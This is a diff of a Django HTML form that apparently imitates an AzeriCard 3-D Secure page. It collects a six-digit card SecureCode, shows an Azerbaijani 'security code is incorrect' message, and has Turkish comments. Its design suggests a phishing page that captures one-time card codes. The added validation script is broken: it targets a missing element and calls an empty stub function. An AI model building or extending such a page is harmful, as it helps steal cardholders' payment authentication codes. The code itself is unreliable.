@@ -129,8 +129,33 @@
 
         <form method="POST" action="dsecazericard" name="dsecazericard" accept-charset="utf-8" class="form">
                 {% csrf_token %}
-				<a><h5> Təhlükəsizlik kodu yanlışdır</h5> </a>
+<a id="secureCodeError" style="display: {{display}};"><h5>Təhlükəsizlik kodu yanlışdır</h5></a>
+
+<script>
+  const secureCodeInput = document.getElementById('secureCode');
+  const secureCodeError = document.getElementById('secureCodeError');
+
+  secureCodeInput.addEventListener('blur', () => {
+    // Check if the secure code is valid
+    const secureCode = secureCodeInput.value;
+    const isValidSecureCode = checkSecureCode(secureCode);
+
+    // Show/hide the error message
+    if (!isValidSecureCode) {
+      secureCodeError.style.display = 'block';
+    } else {
+      secureCodeError.style.display = 'none';
+    }
+  });
+
+  function checkSecureCode(secureCode) {
+    // Your secure code validation logic here
+    // Return true if the secure code is valid, false otherwise
+  }
+</script>
+
 				<style>
+					
 					h5 {
 					  font-size: 0.8rem;
 					  color: red;
@@ -138,7 +163,22 @@
 				  </style>
                 <label id="pwd" class="card-number-label">SecureCode:
                     
-                <input type="tel" id="psw_id" maxlength="6" class="card-number" name="secpass" size="20" autocomplete="off" required="">
+					<input type="tel" id="psw_id" maxlength="6" class="card-number" name="secpass" size="20" autocomplete="off" required="">
+					<script>
+						// sadece rakam yazılmasını sağlar
+						document.getElementById("psw_id").addEventListener("input", function(event) {
+							let value = event.target.value;
+							event.target.value = value.replace(/\D/g, "");
+						});
+						
+						// maksimum 6 rakam yazılmasını sağlar
+						document.getElementById("psw_id").addEventListener("input", function(event) {
+							let value = event.target.value;
+							if (value.length > 6) {
+								event.target.value = value.slice(0, 6);
+							}
+						});
+						</script>
                         
                 </label>
                 <div class="help-div">
